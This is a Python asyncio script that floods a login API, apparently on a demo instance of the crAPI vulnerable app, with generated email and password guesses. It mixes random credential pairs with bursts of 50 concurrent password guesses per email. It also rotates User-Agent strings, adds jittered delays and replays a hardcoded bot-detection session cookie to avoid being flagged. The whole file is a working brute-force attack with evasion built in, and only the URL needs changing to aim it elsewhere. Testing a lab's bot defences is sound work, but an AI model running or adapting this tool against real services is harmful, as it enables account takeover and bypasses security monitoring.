import asyncio
import aiohttp
import random
import string

# Target API endpoint
URL = "https://demo.mycrapiapp.com/identity/api/auth/login"

# Common first and last names
FIRST_NAMES = ["John", "Jane", "Michael", "Emily", "David", "Emma", "Chris", "Olivia", "James", "Sophia"]
LAST_NAMES = ["Smith", "Johnson", "Brown", "Williams", "Jones", "Miller", "Davis", "Garcia", "Martinez", "Hernandez"]
DOMAINS = ["hotmail.com", "gmail.com", "apple.com", "frootcompany.com", "me.com", "icloud.com"]

# List of User-Agent strings
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",
    "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36"
]

# Custom Cookie Header
COOKIE_HEADER = {
    "Cookie": "traceable-session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.ewogICJzaXRlS2V5IjogIlQtODc4NDcyOSIsCiAgInZpc2l0b3IiOiAiOTc2MGY2YjQtY2U3Mi00ZWViLWFhYmMtY2JmZGExODhlNjBjIiwKICAic3RhdGUiOiAiSU5WSVNJQkxFX1BBU1MiLAogICJmbG93cyI6IFsibG9naW4iXSwKICAicmlza3MiOiBbIk9USEVSIiwgIlNDUkVFTiIsICJFTlZJUk9OTUVOVCIsICJJTlRFUkFDVElPTlMiXQp9.Q4tEycxjnRdDIBsqI5eqSnYZLfdiZvvKuI7BbwqxsI4"
}

# Generate a random email
def random_email():
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    domain = random.choice(DOMAINS)
    return f"{first.lower()}.{last.lower()}@{domain}"

# Generate a random password
def random_password():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))

# Perform a single login attempt with a random delay (200ms to 400ms)
async def login_attempt(email, password, session):
    user_agent = random.choice(USER_AGENTS)
    headers = {**COOKIE_HEADER, "User-Agent": user_agent}
    payload = {"email": email, "password": password}

    async with session.post(URL, json=payload, headers=headers) as response:
        status = response.status
        print(f"Email: {email} | Password: {password} | Status: {status} | UA: {user_agent}")
        
        # Random delay between 200ms and 400ms
        await asyncio.sleep(random.uniform(0.2, 0.4))
        return status

# Alternating attack patterns correctly
async def attack_cycle():
    async with aiohttp.ClientSession() as session:
        for _ in range(1337):
            attack_type = random.choice(["random_credentials", "same_email_multi_passwords"])

            if attack_type == "random_credentials":
                # Generate a fresh email & password
                await login_attempt(random_email(), random_password(), session)
            
            elif attack_type == "same_email_multi_passwords":
                # Pick a fresh email EVERY time
                email = random_email()
                tasks = [login_attempt(email, random_password(), session) for _ in range(50)]
                await asyncio.gather(*tasks)  # Runs all at once

# Run the attack
async def main():
    await attack_cycle()

# Execute
asyncio.run(main())

